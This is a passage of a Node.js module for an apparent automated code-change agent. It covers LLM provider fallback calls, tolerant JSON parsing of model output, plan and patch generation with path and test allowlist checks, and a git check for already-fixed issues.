        skipped: timedOut ? "timeout — inconclusive (likely server-dependent / hung), not a failure" : undefined,
        error: String(err.stderr || err.message || "").slice(0, MAX_OUTPUT),
        output: String(err.stdout || "").slice(0, MAX_OUTPUT),
        exit_code: err.status,
      });
    }
  }
  return results;
}

// ── LLM helper (non-streaming) ──────────────────────────────────────────

async function callLlm(system, user, providerHint = "auto", maxTokens = 4096) {
  const geminiKey = process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY;
  const openaiKey = process.env.OPENAI_API_KEY;
  const anthropicKey = process.env.ANTHROPIC_API_KEY;
  const xaiKey = process.env.XAI_API_KEY;
  // Vertex AI (Gemini on a funded GCP project) — paid quota, real rate limits,
  // unlike the free-tier GEMINI_API_KEY (20 req/min). Auth is ADC, not an API key.
  const vertexProject = process.env.VERTEX_PROJECT || process.env.GOOGLE_CLOUD_PROJECT;
  const messages = [{ role: "system", content: system }, { role: "user", content: user }];

  // A provider that returns an empty/whitespace-only string is a FAILURE, not a
  // success: Gemini safety-blocks, a finishReason cutoff, or the tiny local model
  // all surface as "". Returning that stops the cascade and leaves the caller with
  // `plan_parse_failed: empty response` — so treat empty as a throw and fall through.
  const nonEmpty = async (label, p) => {
    const out = await p;
    if (!out || !String(out).trim()) throw new Error(`${label}_empty_response`);
    return out;
  };

  // When a specific provider is requested, try it directly (no cascade).
  if (providerHint !== "auto") {
    if ((providerHint === "vertex" || providerHint === "vertex-gemini") && vertexProject) return nonEmpty("vertex", callVertex(system, user, maxTokens));
    if ((providerHint === "claude" || providerHint === "anthropic") && anthropicKey) return nonEmpty("claude", callClaude(system, user, maxTokens));
    if (providerHint === "openai" && openaiKey) return nonEmpty("openai", callOpenAI(messages, maxTokens));
    if (providerHint === "gemini" && geminiKey) return nonEmpty("gemini", callGemini(system, user, maxTokens));
    if ((providerHint === "grok" || providerHint === "xai") && xaiKey) return nonEmpty("grok", callGrok(messages, maxTokens));
    if (providerHint === "ollama") return nonEmpty("ollama", callOllama(messages));
    throw new Error("no_provider_available");
  }

  // Auto mode: try every provider that has a key, in cascade. Vertex (Gemini on a
  // funded GCP project) leads — it has real paid quota, unlike the free-tier
  // GEMINI_API_KEY (20 req/min) which can't even finish one autowork run. A
  // provider that throws (quota, timeout, parse, OR an empty response) falls
  // through to the next rather than failing the whole run.
  const queue = [
    vertexProject && (() => nonEmpty("vertex", callVertex(system, user, maxTokens))),
    anthropicKey && (() => nonEmpty("claude", callClaude(system, user, maxTokens))),
    geminiKey    && (() => nonEmpty("gemini", callGemini(system, user, maxTokens))),
    xaiKey       && (() => nonEmpty("grok",   callGrok(messages, maxTokens))),
    openaiKey    && (() => nonEmpty("openai", callOpenAI(messages, maxTokens))),
    () => nonEmpty("ollama", callOllama(messages)),
  ].filter(Boolean);

  const errs = [];
  for (const fn of queue) {
    try { return await fn(); } catch (e) { errs.push(e.message || String(e)); }
  }
  throw new Error("all_providers_failed: " + errs.join(" | "));
}

function callOpenAI(messages, maxTokens = 4096) {
  const openaiKey = process.env.OPENAI_API_KEY;
  const model = require("./provider-models").modelFor("openai");
  const payload = JSON.stringify({ model, messages, max_tokens: maxTokens, temperature: 0.3 });
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: "api.openai.com",
      path: "/v1/chat/completions",
      method: "POST",
      agent: llmAgent,
      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${openaiKey}`, "Content-Length": Buffer.byteLength(payload) },
    }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try {
          const j = JSON.parse(data);
          if (j.error) return reject(new Error(j.error.message || "openai_error"));
          resolve(j.choices?.[0]?.message?.content || "");
        } catch { reject(new Error("openai_parse_error")); }
      });
    });
    req.on("error", reject);
    req.setTimeout(30000, () => { req.destroy(); reject(new Error("openai_timeout")); });
    req.write(payload);
    req.end();
  });
}

function callGrok(messages, maxTokens = 4096) {
  // XAI / Grok exposes an OpenAI-compatible Chat Completions API.
  const xaiKey = process.env.XAI_API_KEY;
  const model = require("./provider-models").modelFor("xai");
  const payload = JSON.stringify({ model, messages, max_tokens: maxTokens, temperature: 0.3 });
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: "api.x.ai",
      path: "/v1/chat/completions",
      method: "POST",
      agent: llmAgent,
      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${xaiKey}`, "Content-Length": Buffer.byteLength(payload) },
    }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try {
          const j = JSON.parse(data);
          if (j.error) return reject(new Error((typeof j.error === "string" ? j.error : j.error.message) || "grok_error"));
          resolve(j.choices?.[0]?.message?.content || "");
        } catch { reject(new Error("grok_parse_error")); }
      });
    });
    req.on("error", reject);
    req.setTimeout(30000, () => { req.destroy(); reject(new Error("grok_timeout")); });
    req.write(payload);
    req.end();
  });
}

// ── Vertex AI (Gemini on a funded GCP project) ────────────────────────────
// Auth is Application Default Credentials, NOT an API key. We mint a short-lived
// OAuth access token via the gcloud CLI and cache it (~50 min; tokens last ~60).
// This routes through the project's paid quota (real rate limits), unlike the
// free-tier GEMINI_API_KEY that caps at 20 req/min and can't finish one run.
let _vertexTok = { token: null, exp: 0 };
function vertexAccessToken() {
  const now = Date.now();
  if (_vertexTok.token && now < _vertexTok.exp) return _vertexTok.token;
  // gcloud is gcloud.cmd on Windows; Node won't execFile a .cmd without a shell.
  // The command is a CONSTANT string (no user input), passed as the whole command
  // with shell:true — that avoids DEP0190 (which fires for an args array + shell).
  const bin = process.platform === "win32" ? "gcloud.cmd" : "gcloud";
  const run = (sub) => execFileSync(`${bin} ${sub}`, { encoding: "utf8", timeout: 20000, windowsHide: true, shell: true });
  let out = "";
  try { out = run("auth application-default print-access-token"); }
  catch (e1) {
    try { out = run("auth print-access-token"); }
    catch (e2) { throw new Error("vertex_token_failed: " + String(e2.stderr || e2.message || e1.message || "").slice(0, 200)); }
  }
  const token = String(out).trim();
  if (!token) throw new Error("vertex_token_empty");
  _vertexTok = { token, exp: now + 50 * 60 * 1000 };
  return token;
}

function callVertex(system, user, maxTokens = 4096) {
  const project = process.env.VERTEX_PROJECT || process.env.GOOGLE_CLOUD_PROJECT;
  const location = process.env.VERTEX_LOCATION || "us-central1";
  const model = process.env.VERTEX_MODEL || "gemini-2.5-flash";
  if (!project) return Promise.reject(new Error("vertex_no_project"));
  let token;
  try { token = vertexAccessToken(); } catch (e) { return Promise.reject(e); }
  const payload = JSON.stringify({
    systemInstruction: { parts: [{ text: system }] },
    contents: [{ role: "user", parts: [{ text: user }] }],
    generationConfig: { maxOutputTokens: maxTokens, temperature: 0.3, thinkingConfig: { thinkingBudget: 0 } },
  });
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: `${location}-aiplatform.googleapis.com`,
      path: `/v1/projects/${project}/locations/${location}/publishers/google/models/${model}:generateContent`,
      method: "POST",
      agent: llmAgent,
      headers: { "Content-Type": "application/json", "Authorization": `Bearer ${token}`, "Content-Length": Buffer.byteLength(payload) },
    }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try {
          const j = JSON.parse(data);
          if (j.error) return reject(new Error(`vertex[${j.error.status || j.error.code || "?"}]: ${String(j.error.message || "vertex_error").slice(0, 200)}`));
          const text = j.candidates?.[0]?.content?.parts?.map((p) => p.text || "").join("") || "";
          resolve(text);
        } catch { reject(new Error("vertex_parse_error")); }
      });
    });
    req.on("error", reject);
    req.setTimeout(60000, () => { req.destroy(); reject(new Error("vertex_timeout")); });
    req.write(payload);
    req.end();
  });
}

function callClaude(system, user, maxTokens = 4096) {
  const anthropicKey = process.env.ANTHROPIC_API_KEY;
  const model = require("./provider-models").modelFor("anthropic");
  const payload = JSON.stringify({ model, max_tokens: maxTokens, temperature: 0.3, system, messages: [{ role: "user", content: user }] });
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: "api.anthropic.com",
      path: "/v1/messages",
      method: "POST",
      agent: llmAgent,
      headers: { "Content-Type": "application/json", "x-api-key": anthropicKey, "anthropic-version": "2023-06-01", "Content-Length": Buffer.byteLength(payload) },
    }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try {
          const j = JSON.parse(data);
          if (j.error) return reject(new Error(`claude[${j.error.type||'?'}]: ${j.error.message || JSON.stringify(j.error)}`));
          resolve(j.content?.[0]?.text || "");
        } catch { reject(new Error("claude_parse_error")); }
      });
    });
    req.on("error", reject);
    req.setTimeout(30000, () => { req.destroy(); reject(new Error("claude_timeout")); });
    req.write(payload);
    req.end();
  });
}

function callGemini(system, user, maxTokens = 4096) {
  const geminiKey = process.env.GEMINI_API_KEY || process.env.GOOGLE_API_KEY;
  const model = require("./provider-models").modelFor("gemini");
  const payload = JSON.stringify({
    contents: [{ role: "user", parts: [{ text: `${system}\n\n${user}` }] }],
    generationConfig: { maxOutputTokens: maxTokens, temperature: 0.3, thinkingConfig: { thinkingBudget: 0 } },
  });
  return new Promise((resolve, reject) => {
    const req = https.request({
      hostname: "generativelanguage.googleapis.com",
      path: `/v1beta/models/${model}:generateContent?key=${geminiKey}`,
      method: "POST",
      agent: llmAgent,
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(payload) },
    }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try {
          const j = JSON.parse(data);
          if (j.error) return reject(new Error(j.error.message || "gemini_error"));
          resolve(j.candidates?.[0]?.content?.parts?.[0]?.text || "");
        } catch { reject(new Error("gemini_parse_error")); }
      });
    });
    req.on("error", reject);
    req.setTimeout(30000, () => { req.destroy(); reject(new Error("gemini_timeout")); });
    req.write(payload);
    req.end();
  });
}

function callOllama(messages) {
  const ollamaBase = process.env.OLLAMA_BASE_URL || "http://127.0.0.1:11434";
  const model = process.env.OLLAMA_MODEL || "qwen2.5-coder";
  // Cold model load on the first /api/chat can take well over 30s for a 3B/7B
  // model, which would abort before any token. Match the chat-path default
  // (dream-chat.js / stream-chat.js use 120s) and honour OLLAMA_TIMEOUT_MS. (#690)
  const ollamaTimeout = parseInt(process.env.OLLAMA_TIMEOUT_MS, 10) || 120000;
  const httpLib = ollamaBase.startsWith("https") ? require("https") : require("http");
  const payload = JSON.stringify({ model, messages, stream: false });
  return new Promise((resolve, reject) => {
    const req = httpLib.request({
      hostname: new URL(ollamaBase).hostname,
      port: new URL(ollamaBase).port || 11434,
      path: "/api/chat",
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(payload) },
    }, (res) => {
      let data = "";
      res.on("data", (c) => (data += c));
      res.on("end", () => {
        try {
          const j = JSON.parse(data);
          resolve(j.message?.content || "");
        } catch { reject(new Error("ollama_parse_error")); }
      });
    });
    req.on("error", reject);
    req.setTimeout(ollamaTimeout, () => { req.destroy(); reject(new Error("ollama_timeout")); });
    req.write(payload);
    req.end();
  });
}

// ── JSON extraction (resilient against markdown fences + preamble) ───────

// Parse JSON, tolerating the usual LLM-JSON sins (// and /* */ comments,
// trailing commas). Returns undefined on failure (JSON.parse never yields
// undefined, so it is a safe "no result" sentinel).
function tryParseLoose(text) {
  if (!text || typeof text !== "string") return undefined;
  const t = text.trim();
  if (!t) return undefined;
  try { return JSON.parse(t); } catch {}
  const cleaned = t
    .replace(/\/\*[\s\S]*?\*\//g, "")            // /* block comments */
    .replace(/(^|[^:"'\\])\/\/[^\n\r]*/g, "$1")  // // line comments (not http://)
    .replace(/,(\s*[}\]])/g, "$1");              // trailing commas
  try { return JSON.parse(cleaned); } catch {}
  // Smart/typographic quotes: some models emit JSON with “curly” double quotes
  // (or ‘curly’ singles) for the structural delimiters, which JSON.parse rejects
  // — a real autowork failure (plan_parse_failed). Normalize to straight quotes.
  const dequoted = cleaned
    .replace(/[“”„‟]/g, '"')
    .replace(/[‘’‚‛]/g, "'");
  try { return JSON.parse(dequoted); } catch {}
  return undefined;
}

// Best-effort repair of a truncated / imbalanced object or array: close an
// unterminated string, drop a dangling comma, and balance the open {/[ that
// the model never closed (it got cut off mid-JSON).
function repairJson(text) {
  let t = String(text)
    .replace(/\/\*[\s\S]*?\*\//g, "")
    .replace(/,(\s*[}\]])/g, "$1");
  const stack = [];
  let inStr = false, esc = false;
  for (let i = 0; i < t.length; i++) {
    const ch = t[i];
    if (inStr) {
      if (esc) esc = false;
      else if (ch === "\\") esc = true;
      else if (ch === '"') inStr = false;
      continue;
    }
    if (ch === '"') inStr = true;
    else if (ch === "{" || ch === "[") stack.push(ch);
    else if (ch === "}" || ch === "]") stack.pop();
  }
  if (inStr) t += '"';
  t = t.replace(/,\s*$/, "");
  for (let i = stack.length - 1; i >= 0; i--) t += stack[i] === "{" ? "}" : "]";
  return t;
}

// Resilient against markdown fences (with or without a closing fence),
// preamble/commentary, comments, trailing commas, and truncated output.
function extractJson(raw) {
  if (!raw || typeof raw !== "string") throw new Error("empty response");
  const trimmed = raw.trim();

  const candidates = [trimmed];
  // ```json … ``` (or ``` … ```) with a closing fence
  const fenceMatch = trimmed.match(/```(?:json)?\s*\n?([\s\S]*?)\n?```/i);
  if (fenceMatch) candidates.push(fenceMatch[1]);
  // a LONE opening fence with no closing one (truncated / sloppy models)
  if (/^```/.test(trimmed)) {
    candidates.push(trimmed.replace(/^```(?:json)?[^\n]*\n?/i, "").replace(/```\s*$/i, ""));
  }
  // first { … last }  and  first [ … last ]
  const oStart = trimmed.indexOf("{"), oEnd = trimmed.lastIndexOf("}");
  if (oStart !== -1 && oEnd > oStart) candidates.push(trimmed.slice(oStart, oEnd + 1));
  const aStart = trimmed.indexOf("["), aEnd = trimmed.lastIndexOf("]");
  if (aStart !== -1 && aEnd > aStart) candidates.push(trimmed.slice(aStart, aEnd + 1));

  for (const c of candidates) {
    const parsed = tryParseLoose(c);
    if (parsed !== undefined) return parsed;
  }

  // Last resort: repair a truncated object/array from its first opener.
  const opener = oStart !== -1 ? oStart : aStart;
  if (opener !== -1) {
    const body = trimmed.slice(opener).replace(/```\s*$/i, "");
    const parsed = tryParseLoose(repairJson(body));
    if (parsed !== undefined) return parsed;
  }

  throw new Error("no valid JSON found in model response");
}

// ── Plan generation ─────────────────────────────────────────────────────

const PLAN_SYSTEM_PROMPT = `You are a disciplined code-change planner. Given a user request and relevant file contents, produce a structured plan.

Respond ONLY with valid JSON in this exact shape (no markdown, no commentary outside the JSON):
{
  "summary": "one-line description",
  "affectedFiles": ["relative/path/to/file.js"],
  "riskLevel": "low|medium|high",
  "testsToRun": ["node tests/test_dream_journal_api.js"],
  "steps": [
    { "action": "edit", "file": "path", "description": "what to change" }
  ],
  "branchHint": "short-kebab-name"
}`;

async function generatePlan(repoRoot, userRequest, scopeFiles, history) {
  let fileContext = "";
  if (Array.isArray(scopeFiles) && scopeFiles.length > 0) {
    for (const fp of scopeFiles) {
      if (!isPathSafe(repoRoot, fp)) continue;
      const full = path.join(repoRoot, fp);
      if (fs.existsSync(full)) {
        const content = fs.readFileSync(full, "utf8").slice(0, 4000);
        fileContext += `\n--- ${fp} ---\n${content}\n`;
      }
    }
  }

  const historyContext = Array.isArray(history) && history.length > 0
    ? `Chat history:\n${history.slice(-6).map(h => `${h.role}: ${h.text}`).join("\n")}\n\n`
    : "";

  const userPrompt = `${historyContext}User request: ${userRequest}\n\nRelevant files:\n${fileContext || "(none specified — infer from request)"}\n\nProduce the JSON plan.`;

  // Generate + parse with one retry: models intermittently wrap the JSON in a
  // code fence, add a trailing comma, or get cut off. extractJson recovers most
  // of that; the retry re-asks with a stricter reminder for the rest.
  let plan, raw = "", lastErr;
  for (let attempt = 1; attempt <= 2; attempt++) {
    const sys = attempt === 1
      ? PLAN_SYSTEM_PROMPT
      : PLAN_SYSTEM_PROMPT + "\n\nIMPORTANT: your previous reply could not be parsed as JSON. " +
        "Reply with ONLY the raw JSON object — no code fences, no comments, no trailing commas — and make sure it is complete.";
    raw = await callLlm(sys, userPrompt, "auto");
    try { plan = extractJson(raw); break; } catch (e) { lastErr = e; }
  }
  if (!plan) {
    throw new Error("plan_parse_failed: " + (lastErr ? lastErr.message : "unknown") + " | raw=" + raw.slice(0, 300));
  }

  // Validate plan structure
  if (!Array.isArray(plan.affectedFiles)) plan.affectedFiles = [];
  if (!Array.isArray(plan.testsToRun)) plan.testsToRun = [];
  if (!Array.isArray(plan.steps)) plan.steps = [];
  plan.riskLevel = ["low", "medium", "high"].includes(plan.riskLevel) ? plan.riskLevel : "medium";
  plan.branchHint = sanitizeBranchName(plan.branchHint || "auto-change").replace(/^auto\//, "");

  // Resolve bare-basename paths to real repo locations so the patch generator edits
  // the existing file instead of duplicating it at the wrong path (#777).
  plan.affectedFiles = plan.affectedFiles.map((fp) => resolveRepoPath(repoRoot, fp));
  for (const s of plan.steps) { if (s && typeof s.file === "string") s.file = resolveRepoPath(repoRoot, s.file); }
  // Ensure all affected files are safe
  requireSafePaths(repoRoot, plan.affectedFiles);
  // Filter tests to allowlisted only
  plan.testsToRun = plan.testsToRun.filter((cmd) => isAllowedTest(cmd));

  return plan;
}

// ── Patch generation ────────────────────────────────────────────────────

const PATCH_SYSTEM_PROMPT = `You are a precise patch generator. Given an approved plan and file contents, generate a unified diff (git diff format) that implements the plan.

Rules:
- Output ONLY the unified diff. No markdown fences, no explanation.
- Use \`--- a/path\` and \`+++ b/path\` headers.
- Each hunk must have \`@@ -start,count +start,count @@\`.
- Context lines start with a space. Removed lines start with \`-\`. Added lines start with \`+\`.
- Do NOT change unrelated lines.
- If creating a new file, use \`--- /dev/null\` and \`+++ b/path\` with a single hunk starting at line 0.
`;

async function generatePatch(repoRoot, plan, opts = {}) {
  let fileContext = "";
  // Include (nearly) the FULL file, not a 6KB slice. A truncated file makes the
  // model invent context for anything past the cut — the #1 cause of "hunk context
  // mismatch" apply failures (e.g. a leaderboard write near the end of a long file).
  const PER_FILE_CAP = 24000;
  for (const fp of plan.affectedFiles || []) {
    if (!isPathSafe(repoRoot, fp)) continue;
    const full = path.join(repoRoot, fp);
    if (fs.existsSync(full)) {
      const raw = fs.readFileSync(full, "utf8");
      const content = raw.length > PER_FILE_CAP ? raw.slice(0, PER_FILE_CAP) + "\n…(truncated)…\n" : raw;
      fileContext += `\n--- ${fp} ---\n${content}\n`;
    } else {
      fileContext += `\n--- ${fp} ---\n<new file>\n`;
    }
  }

  let userPrompt = `Plan summary: ${plan.summary}\n\nSteps:\n${plan.steps.map((s, i) => `${i + 1}. [${s.action}] ${s.file}: ${s.description}`).join("\n")}\n\n${fileContext}\n\nGenerate the unified diff.`;

  // Feedback retry: when a prior diff failed to apply, show the model its own diff
  // and the exact apply errors, and insist it copy context EXACTLY from the file
  // bodies above (which are ground truth). This is what lets autowork self-correct
  // hunk-count / hallucinated-context failures instead of aborting on attempt 1.
  if (opts.feedback && opts.feedback.errors) {
    userPrompt +=
      `\n\n--- YOUR PREVIOUS DIFF FAILED TO APPLY ---\nErrors:\n${opts.feedback.errors}\n\n` +
      (opts.feedback.priorDiff ? `Previous diff:\n${opts.feedback.priorDiff}\n\n` : "") +
      `The file contents shown above are the GROUND TRUTH. Reproduce context lines ` +
      `byte-for-byte (exact whitespace, exact text), use correct @@ line numbers/counts, ` +
      `and do not invent lines that aren't in the file. Output ONLY the corrected unified diff.`;
  }

  const raw = await callLlm(PATCH_SYSTEM_PROMPT, userPrompt, "auto");
  const diffText = raw.replace(/^```diff\n?/, "").replace(/^```\n?/, "").replace(/\n?```$/, "").trim();
  const files = validateDiff(diffText, repoRoot);
  return { diffText, files };
}

// ── Module exports ────────────────────────────────────────────────────────

// ── Already-implemented preflight ─────────────────────────────────────────
// Cheap git-only check: has this issue's fix already landed? Open-but-fixed
// issues are the #1 cause of wasted autowork runs — the loop regenerates a
// stale diff, then aborts at the apply gate. We look for two signals on the
// current checkout: (a) the issue number cited in a code comment/string, and
// (b) a commit message referencing the issue. Either is treated as "likely
// already implemented"; the caller surfaces the citation and skips unless the
// run is forced. Heuristic by design — it errs toward surfacing, not blocking.
function detectAlreadyImplemented(repoRoot, issueNumber, opts = {}) {
  const n = String(issueNumber).replace(/[^0-9]/g, "");
  // #942: ground the preflight on the SERVING state (origin/master) — not the
  // local checkout's HEAD, which can be a stale feature branch that misses
  // already-landed fixes. Best-effort fetch keeps origin/master current; if the
  // ref can't be resolved we fall back to HEAD so the function still works offline.
  let baseRef = opts.baseRef || "origin/master";
  const empty = { implemented: false, citations: [], commits: [], ref: baseRef };
  if (!n) return empty;

  const runGit = (args) => {
    try {
      return execFileSync("git", args, {
        cwd: repoRoot, encoding: "utf8", timeout: 15000, windowsHide: true,
      });
    } catch (e) {
      // git grep exits 1 when there are no matches — that's "not found", not a
      // failure. Salvage any stdout; treat everything else as no matches.
      return e && e.stdout ? String(e.stdout) : "";
    }
  };

  // Refresh + verify the base ref; fall back to HEAD if origin/master is absent.
  try {
    execFileSync("git", ["fetch", "origin", "master", "--quiet"], {
      cwd: repoRoot, encoding: "utf8", timeout: 20000, windowsHide: true,
    });
  } catch (_e) { /* offline / no remote — use whatever origin/master we have */ }
  try {
    execFileSync("git", ["rev-parse", "--verify", "--quiet", baseRef], {
      cwd: repoRoot, encoding: "utf8", timeout: 5000, windowsHide: true,
    });
  } catch (_e) { baseRef = "HEAD"; }

  // (a) Code citations: an issue ref in a comment/string ("issue NNN",
  // "issues/NNN", or a hash-prefixed number) — bounded so a longer number can't
  // match a shorter one. Restricted to source files so docs/handoffs/changelog
  // (which mention issues without implementing them) don't trigger false hits.
  const pattern = `(#|issues?/|issue[ #]+)0*${n}([^0-9]|$)`;
  const citations = [];
  const grepOut = runGit([
    "grep", "-n", "-E", "-I", "-i", pattern, baseRef, "--",
    "*.js", "*.mjs", "*.cjs", "*.ts", "*.py", "*.ps1", "*.sh",
    ":(exclude)**/node_modules/**",
  ]);
  // git grep against a TREE (origin/master/HEAD) prefixes each hit with "<ref>:"
  // — strip it so the "file:line:" parse works the same as a working-tree grep (#942).
  const refPrefix = baseRef + ":";
  for (const raw of grepOut.split(/\r?\n/)) {
    const line = raw.startsWith(refPrefix) ? raw.slice(refPrefix.length) : raw;
    const m = line.match(/^([^:]+):(\d+):/);
    if (m) citations.push({ file: m[1].replace(/\\/g, "/"), line: Number(m[2]) });
    if (citations.length >= 10) break;
  }

  // (b) Commit messages referencing the issue (a "fixes"/"closes" hash ref).
  const commits = [];
  const logOut = runGit([
    "log", "-E", "--grep", `#${n}\\b`, "--pretty=format:%h %s", "-n", "10", baseRef,
  ]);
  for (const line of logOut.split(/\r?\n/)) {
    const t = line.trim();
    if (t) commits.push(t);
  }

  return {
    implemented: citations.length > 0 || commits.length > 0,
    citations,
    commits,
    ref: baseRef,
  };
}

module.exports = {
  isPathSafe,
  detectAlreadyImplemented,
  sanitizeBranchName,
  parseUnifiedDiff,
  validateDiff,
  applyPatch,
  applyPatchStrict,
  gitCreateBranch,
  gitEnsureClean,
  gitCommit,
  gitPush,
  gitDiffStat,
  gitAddAll,
  gitAddFiles,
  gitCurrentBranch,
  openDraftPr,
  pushRemoteOwner,
  createIssueFromTask,
  resolveExistingIssue,
  isFileIssueOnlyRequest,
  looksLikePlaceholderPatch,
  patchSyntaxErrors,
  taskTitle,
  runTests,
  generatePlan,
  extractJson,
  generatePatch,
  callLlm,
  isAllowedTest,
  tokenizeAllowedCommand,
  requireSafePaths,
  resolveRepoPath,
};
